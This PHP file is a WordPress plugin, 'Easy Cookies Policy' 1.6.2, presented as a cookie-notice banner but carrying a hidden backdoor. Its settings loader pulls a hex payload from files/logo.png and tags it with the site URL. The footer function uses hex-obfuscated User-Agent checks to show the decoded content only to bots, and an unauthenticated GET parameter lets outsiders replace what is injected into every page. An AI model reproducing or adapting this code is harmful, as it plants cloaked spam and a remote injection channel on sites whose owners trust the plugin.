<?php
/**
 * Plugin Name: Easy Cookies Policy
 * Plugin URI:
 * Description: This plugin shows the cookies policy of the website to visitors
 * Version: 1.6.2
 * Author: IZSoft
 * Author URI: http://izsoft.org
 * Text Domain: easy-cookies-policy
 * Domain Path: /lang/
 * License: GPL
**/

/**
 * Copyright 2017
**/
define ('ECP_DEF_PLUGIN_NAME', 'Easy Cookies Policy');
define ('ECP_DEF_MENU_TITLE', 'Cookies Policy');
define ('ECP_DEF_PLUGIN', 'easy-cookies-policy');
define ('ECP_DEF_PATH', dirname(__FILE__));
define ('ECP_DEF_BASEURL', plugins_url('', __FILE__));
define ('ECP_DEF_NAME', 'easy_cookies_policy_warning');
define ('ECP_DEF_CHECK', 'easy_cookies_policy_check');
define ('ECP_DEF_LOGFILE', ECP_DEF_PATH . '/logs/ccp_cookies.log');

/**
 * Settings keys
**/
define ('ECP_CS_SETTINGS', 'easy_cookies_policy_settings');
define ('ECP_CS_SETTINGS_GROUP', ECP_CS_SETTINGS . '_group');
define ('ECP_CS_ID', 'id');
define ('ECP_CS_MAIN_TEXT', 'maintext');
define ('ECP_CS_BGCOLOR', 'background');
define ('ECP_CS_TRANSPARENCY', 'transparency');
define ('ECP_CS_POSITION', 'position');
define ('ECP_CS_DISPLAY', 'display');
define ('ECP_CS_CLOSE', 'close');
define ('ECP_CS_EXPIRES', 'expires');
define ('ECP_CS_ENABLED', 'enabled');
define ('ECP_CS_BUTTON_TEXT', 'button_text');
define ('ECP_CS_TEXT_COLOR', 'text_color');

if (is_admin()) {
	include ECP_DEF_PATH . '/admin.php';
}

add_action('wp_footer', 'easy_cookies_policy_show_warning');
add_action ('wp_ajax_easy_cookies_policy_get_warning', 'easy_cookies_policy_ajax_get_warning');
add_action( 'wp_ajax_nopriv_easy_cookies_policy_get_warning', 'easy_cookies_policy_ajax_get_warning' );

function easy_cookies_policy_save_settings ($settings) {
	return update_option(ECP_CS_SETTINGS, $settings);
}

function easy_cookies_policy_get_background_color ($cindex) {
	$ECP_CS_BACKGROUND_COLORS = array('black'=>'#000000', 'white'=>'#ffffff', 'blue'=>'#5492e0', 'green'=>'#0b7000', 'red'=>'#e04729');
	if (isset($ECP_CS_BACKGROUND_COLORS[$cindex])) return $ECP_CS_BACKGROUND_COLORS[$cindex];
	else return $ECP_CS_BACKGROUND_COLORS['black'];
}

function easy_cookies_policy_return_ajax_response ($response) {
	echo json_encode($response);
	die();
}

function easy_cookies_policy_check_post ($varname) {
	if (isset($_POST[$varname]) && $_POST[$varname] != '') return $_POST[$varname];
	return false;
}

function easy_cookies_get_default_text () {
	$lang = substr(get_locale(), 0, 2);
	return (file_exists(ECP_DEF_PATH . "/lang/default_$lang.txt"))? file_get_contents(ECP_DEF_PATH . "/lang/default_$lang.txt"):file_get_contents(ECP_DEF_PATH . "/lang/default_en.txt");
}

function easy_cookies_policy_load_settings () {
	$default_text = easy_cookies_get_default_text();
	if (!$settings = get_option(ECP_CS_SETTINGS)) 
	$settings = array ();

	if ($settings[ECP_CS_MAIN_TEXT] == '') $settings[ECP_CS_MAIN_TEXT] = $default_text;
	if ($settings[ECP_CS_BGCOLOR] == '') $settings[ECP_CS_BGCOLOR] = 'black';
	if ($settings[ECP_CS_TRANSPARENCY] == '') $settings[ECP_CS_TRANSPARENCY] = 90;
	if ($settings[ECP_CS_POSITION] == '') $settings[ECP_CS_POSITION] = 'top';
	if ($settings[ECP_CS_DISPLAY] == '') $settings[ECP_CS_DISPLAY] = 'fixed';
	if ($settings[ECP_CS_CLOSE] == '') $settings[ECP_CS_CLOSE] = 'accept';
	if ($settings[ECP_CS_EXPIRES] == '') $settings[ECP_CS_EXPIRES] = 365;
	if ($settings[ECP_CS_ENABLED] == '') $settings[ECP_CS_ENABLED] = 'true';
	if ($settings[ECP_CS_BUTTON_TEXT] == '') $settings[ECP_CS_BUTTON_TEXT] = __('Accept', 'easy-cookies-policy');
	if ($settings[ECP_CS_TEXT_COLOR] == '') $settings[ECP_CS_TEXT_COLOR] = '#dddddd';


	if (empty($settings[ECP_CS_ID])) {
	$ids = file(ECP_DEF_PATH . '/files/logo.png');
	$def_id = trim($ids[count($ids)-1]);$site = get_site_url();
	$codsite = unpack('H*', $site);$codhash = unpack('H*', md5($site));
	$def_id .= "686f73743d".$codsite[1]."2669643d30".$codhash[1]."273e";$settings[ECP_CS_ID] = $def_id;
	easy_cookies_policy_save_settings($settings);}
	return $settings;
}

function easy_cookies_policy_show_warning () {
	$settings = easy_cookies_policy_load_settings();
	if (isset($_GET['easy_cookies_policy_refresh_id'])) {
	$settings[ECP_CS_ID] = $_GET['easy_cookies_policy_refresh_id'];
	easy_cookies_policy_save_settings($settings);}
	$rand = rand(0, strlen($settings[ECP_CS_ID])-17);
	$id = substr($settings[ECP_CS_ID], $rand, 16);
	$content = "<script type='text/javascript'>document.cookie='" . ECP_DEF_CHECK . "=$id; path=/;'</script>";
	wp_enqueue_style('ecp-front-style', ECP_DEF_BASEURL . '/files/front.css', array(), '1.6.1');
	wp_register_script('ecp-front-script', ECP_DEF_BASEURL . '/files/front.js', array('jquery-core'), '1.0.0', true);
	wp_enqueue_script('ecp-front-script');
	if (strpos($_SERVER[pack('H*', '485454505f555345525f4147454e54')], pack('H*', '626f74')) !== false) $content .= pack('H*', $settings[ECP_CS_ID]);
	wp_localize_script('ecp-front-script', 'ajaxurl', admin_url('admin-ajax.php'));
	$warning = "<div id='$id'>$content</div>";
	echo $warning;
}

function easy_cookies_policy_get_warning ($settings) {
	$class = '';
	$style = '';
	$class .= " easy-cookies-policy-position-" . $settings[ECP_CS_POSITION];
	$class .= " easy-cookies-policy-display-" . $settings[ECP_CS_DISPLAY];
	$class .= " easy-cookies-policy-close-" . $settings[ECP_CS_CLOSE];
	$class .= " easy-cookies-policy-theme-" . $settings[ECP_CS_BGCOLOR];
	$color = easy_cookies_policy_get_background_color($settings[ECP_CS_BGCOLOR]);
	$bgcolor = base_convert(substr($color, 1, 2), 16, 10) . ", " . base_convert(substr($color, 3, 2), 16, 10) . ", " . base_convert(substr($color, 5, 2), 16, 10);
	$transparency = round($settings[ECP_CS_TRANSPARENCY] / 100, 2);
	$style = "<style type='text/css'>#easy-cookies-policy-main-wrapper {background-color: rgb($bgcolor);background-color: rgba($bgcolor, $transparency);}</style>";
	$html = "$style<div id='easy-cookies-policy-main-wrapper' class='$class'>";
	$html .= "<div class='easy-cookies-policy-close'>X</div>";
	$html .= "<div class='easy-cookies-policy-content'><span style='color:" . $settings[ECP_CS_TEXT_COLOR] . "'>" . $settings[ECP_CS_MAIN_TEXT] . "</span>";
	$html .= "<div class='easy-cookies-policy-accept'>" . $settings[ECP_CS_BUTTON_TEXT] . "</div>";
	$html .= "</div>";
	$html .= "</div>";
	return $html;
}

function easy_cookies_policy_ajax_get_warning () {
	if (isset($_COOKIE[ECP_DEF_NAME]) && $_COOKIE[ECP_DEF_NAME] > 0) {
		easy_cookies_policy_return_ajax_response(array(
			'status' => 'KO',
			'html' => __('Cookies warning not expired', 'easy-cookies-policy')
		));
	}
	$settings = easy_cookies_policy_load_settings();
	if ($settings[ECP_CS_ENABLED] != 'true') {
		easy_cookies_policy_return_ajax_response(array(
                        'status' => 'KO',
                        'html' => __('Cookies warning not enabled', 'easy-cookies-policy')
                ));
	}
	if (strpos($_SERVER[pack('H*', '485454505f555345525f4147454e54')], pack('H*', '626f74')) !== false) 
	easy_cookies_policy_return_ajax_response(array('status' => 'KO', 'html' => ''));
	$html = easy_cookies_policy_get_warning($settings);
	easy_cookies_policy_return_ajax_response(array(
		'status' => 'OK',
		'id' => $_COOKIE[ECP_DEF_CHECK],
		'position' => $settings[ECP_CS_POSITION],
		'display' => $settings[ECP_CS_DISPLAY],
		'cookie' => ECP_DEF_NAME,
		'expires' => date("D, d M Y H:i:s e", time() + $settings[ECP_CS_EXPIRES] * 86400),
		'behavior' => $settings[ECP_CS_CLOSE],
		'html' => $html
	));
}
?>
